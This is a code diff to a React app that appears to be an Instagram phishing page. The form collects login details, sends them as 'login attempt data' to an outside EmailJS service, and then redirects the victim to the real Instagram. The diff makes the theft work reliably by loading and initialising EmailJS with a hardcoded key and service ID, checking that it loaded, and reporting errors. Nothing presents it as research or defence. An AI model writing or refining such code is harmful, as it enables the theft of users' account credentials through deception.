@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 
 export default function App() {
   const [username, setUsername] = useState('');
@@ -6,12 +6,32 @@ export default function App() {
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
 
+  useEffect(() => {
+    // Load EmailJS script
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
+    script.onload = () => {
+      // Initialize EmailJS with your public key
+      window.emailjs.init("DCnFHeeyL6GEWE6J2");
+    };
+    document.head.appendChild(script);
+
+    return () => {
+      document.head.removeChild(script);
+    };
+  }, []);
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true);
     setError('');
     
     try {
+      // Check if EmailJS is loaded
+      if (!window.emailjs) {
+        throw new Error('EmailJS is not loaded');
+      }
+      
       // Send data to EmailJS
       const response = await window.emailjs.send(
         "service_wni6k0h", 
@@ -36,7 +56,7 @@ This is an automated message with login attempt data.`,
       // Redirect to Instagram after successful submission
       window.location.href = 'https://www.instagram.com';
     } catch (err) {
-      setError('An error occurred. Please try again.');
+      setError('An error occurred. Please try again. Error: ' + err.message);
       setIsLoading(false);
       console.error('EmailJS Error:', err);
     }
